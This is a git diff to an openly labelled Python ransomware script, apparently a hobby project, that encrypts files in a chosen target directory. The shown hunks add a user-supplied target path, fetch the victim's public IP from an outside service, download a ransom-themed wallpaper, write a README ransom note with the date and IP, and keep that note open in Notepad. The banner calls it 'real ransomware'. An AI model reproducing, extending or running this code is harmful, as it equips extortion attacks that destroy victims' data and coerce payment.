@@ -16,12 +16,12 @@ from Crypto.Cipher import PKCS1_OAEP
 class Ransomware:
     exts = ['txt', 'png']
 
-    def __init__(self):
+    def __init__(self, targetDir="C:/Users/Public/Public Desktop"):
         self.ransomKey = None
         self.crypter = None
         self.publicKey = None
         self.homeDir = os.path.expanduser('~')
-        self.targerDir = "REDACTED"
+        self.targerDir = targetDir
         self.publicIP = requests.get('https://api.ipify.org').text
 
     def gen_ransom_key(self):
@@ -72,7 +72,7 @@ class Ransomware:
 
     def change_desktop_background(self):
         imageURL = 'https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876-100749983-large.jpg'
-        path = 'REDACTED'
+        path = self.targerDir
         urllib.request.urlretrieve(imageURL, path)
         SPI_SETDESKWALLPAPER = 20
         ctypes.windll.user32.SystemParametersInfoW(
@@ -83,10 +83,11 @@ class Ransomware:
         with open('README.txt', 'w') as f:
             f.write(f'''
             The harddisks of your computer have been encrypted with an Military grade encryption algorithm.
-            There is no way to restore your data without a special key. Only we can decrypt your files!
+            There is no way to restore your data without a special key. Only we can decrypt your files! \n Date ecnrypted : {date} \n IP Adress {self.publicIP}: 
             ''')
 
-    def show_ransom_note(self):
+    @staticmethod
+    def show_ransom_note():
         ransom = subprocess.Popen(['notepad.exe', 'README.txt'])
         while True:
             time.sleep(0.1)
@@ -101,8 +102,31 @@ class Ransomware:
             time.sleep(5)
 
 
+def welcome_msg():
+    welcome = '''
+     _______                                                                           
+    /       \                                                                          
+    $$$$$$$  | __    __   ______   ______   _______    _______   ______   _____  ____  
+    $$ |__$$ |/  |  /  | /      \ /      \ /       \  /       | /      \ /     \/    \ 
+    $$    $$/ $$ |  $$ |/$$$$$$  |$$$$$$  |$$$$$$$  |/$$$$$$$/ /$$$$$$  |$$$$$$ $$$$  |
+    $$$$$$$/  $$ |  $$ |$$ |  $$/ /    $$ |$$ |  $$ |$$      \ $$ |  $$ |$$ | $$ | $$ |
+    $$ |      $$ \__$$ |$$ |     /$$$$$$$ |$$ |  $$ | $$$$$$  |$$ \__$$ |$$ | $$ | $$ |
+    $$ |      $$    $$ |$$ |     $$    $$ |$$ |  $$ |/     $$/ $$    $$/ $$ | $$ | $$ |
+    $$/        $$$$$$$ |$$/       $$$$$$$/ $$/   $$/ $$$$$$$/   $$$$$$/  $$/  $$/  $$/ 
+            /  \__$$ |                                                               
+            $$    $$/                                                                
+            $$$$$$/                                                                 v1.0.0 by retr00exe
+
+    Warning : This is real ransomware script. Using VM is highly recommended to avoid unexpected damage.
+    '''
+    print(welcome)
+
+
 def main():
-    pyransom = Ransomware()
+
+    welcome_msg()
+    targetDir = input("Enter target directory : ")
+    pyransom = Ransomware(targetDir)
     pyransom.gen_ransom_key()
     pyransom.encrypt_system()
     pyransom.write_ransom_key()
